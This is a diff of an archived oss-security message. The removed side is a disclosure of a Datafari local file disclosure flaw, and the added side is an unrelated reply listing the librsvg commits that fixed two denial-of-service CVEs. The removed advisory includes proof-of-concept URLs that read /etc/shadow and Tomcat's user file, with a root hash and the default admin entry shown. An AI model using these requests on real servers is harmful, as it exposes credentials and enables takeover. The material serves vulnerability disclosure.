@@ -1,70 +1,53 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/03/4
-Message-ID: <A029BE905CDA9E49AF495A6ADB7F71A7D46E8CFB@SEATTLE.lexsi.lan>
-Date: Wed, 3 Feb 2016 15:55:07 +0000
-From: PASCAULT Wilfried <wpascault@...si.com>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: CVE Request: Datafari Local File Disclosure
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/10/15
+Message-ID: <87d1otk0an.fsf@prune.linuxpenguins.xyz>
+Date: Wed, 11 May 2016 08:36:48 +1000
+From: Brian May <brian@...uxpenguins.xyz>
+To: gustavo.grieco@...il.com
+Cc: oss-security@...ts.openwall.com
+Subject: Re: Re: CVE requests: DoS in librsvg parsing SVGs with circular definitions
 Content-Type: text/plain; charset=utf-8
 
-Datafari, an Open source enterprise search software using Apache Solr, ManifoldCF and Tomcat is proned to a local file disclosure vulnerability.
+Just did a git bisect against the source. Assuming I got this right, the
+following commits fixed the issue.
 
-Product's information
----------------------
-* Name : Datafari - http://www.datafari.com/
-* Editor: France Labs
-* Affected versions: 2.x<2.1.3
-* Tested : 2.1.0 and 2.1.1 on Debian Wheezy 7 and Jesse 8
+>> They affect the following functions:
+>
+>> * rsvg_cairo_pop_discrete_layer - rsvg_cairo_pop_render_stack -
+>> rsvg_cairo_generate_mask: reproducible using circular-1.svg
+>
+> Use CVE-2016-4347.
 
-Description
------------
-When "filesystem" repository has been configured into Datafari (administrative privileges on Datafari required), a user could access to any file of the system with root privileges.
+Fixed in:
 
-On "$INSTALLPATH$/datafari/tomcat/conf/datafari.properties" configuration file, "ALLOWLOCALFILEREADING" parameter allows by default to read file on system.
+commit a51919f7e1ca9c535390a746fbf6e28c8402dc61
+Author: Benjamin Otte <otte@...hat.com>
+Date:   Wed Oct 7 08:45:37 2015 +0200
 
-Datafari is by default running as user root, so any file could be downloaded with "url=file:/" parameter in "/Datafari/URL" (token isn't checked).
-
-This issue is exploitable only when "Filesystem" repository has been set on ManifoldCF.
-
-Proof of concept
-----------------
-http://localhost:8080/Datafari/URL?url=file:/arbitrary_file
-
-http://localhost:8080/Datafari/URL?url=file:/etc/shadow
-=> file will be downloaded as _etc_shadow
-
-$ head _etc_shadow
-root:$6$nTTh32TT$rLqcSGDf92tyh9aXtuTqnlGW4Ewr.IzBEcdP/kMnvhNYELz7iUgmOyiWesbJRUwEeKdKk/2yQcnAVBQYBGsiD.:16714:0:99999:7:::
-daemon:*:16714:0:99999:7:::
-bin:*:16714:0:99999:7:::
-sys:*:16714:0:99999:7:::
-sync:*:16714:0:99999:7:::
-games:*:16714:0:99999:7:::
-man:*:16714:0:99999:7:::
-lp:*:16714:0:99999:7:::
-mail:*:16714:0:99999:7:::
-news:*:16714:0:99999:7:::
-
-another funny file ^_^ (Tomcat manager password could not be changed during installation)
-http://localhost:8080/Datafari/URL?url=file://opt/datafari/tomcat/conf/tomcat-users.xml
-$ cat _opt_datafari_tomcat_conf_tomcat-users.xml|grep admin
-  <user password="@PASSWORD@" roles="manager-gui,SearchAdministrator" username="admin"/>
-
-http://localhost:8080/manager/html/list
+    rsvg: Add rsvg_acquire_node()
+    
+    This function does proper recursion checks when looking up resources
+    from URLs and thereby helps avoiding infinite loops when cyclic
+    references span multiple types of elements.
 
 
-Workaround
-----------
-Set "ALLOWLOCALFILEREADING=false" on "$INSTALLPATH$/datafari/tomcat/conf/datafari.properties" and restart Datafari
+>> * _rsvg_css_normalize_font_size: reproducible using circular-2.svg
+>
+> Use CVE-2016-4348.
 
-Timeline
---------
-1/6/2016: reported to vendor
-1/11/2016: vendor response but said was not a security issue
-1/11/2016: add technical details and POC
-1/11/2016: vendor acknowledged as a security issue
-1/11/2016: patch was commited in master branch
-1/28/2016: 2.1.3 released
+Fixed in:
 
-Thanks to Cédric and Aurélien from Datafari project for their quick replies.
+commit d1c9191949747f6dcfd207831d15dd4ba00e31f2
+Author: Benjamin Otte <otte@...hat.com>
+Date:   Wed Oct 7 05:31:08 2015 +0200
 
+    state: Store mask as reference
+    
+    Instead of immediately looking up the mask, store the reference and look
+    it up on use.
+
+
+This fix is two commits before the other commit.
+-- 
+Brian May <brian@...uxpenguins.xyz>
+https://linuxpenguins.xyz/brian/
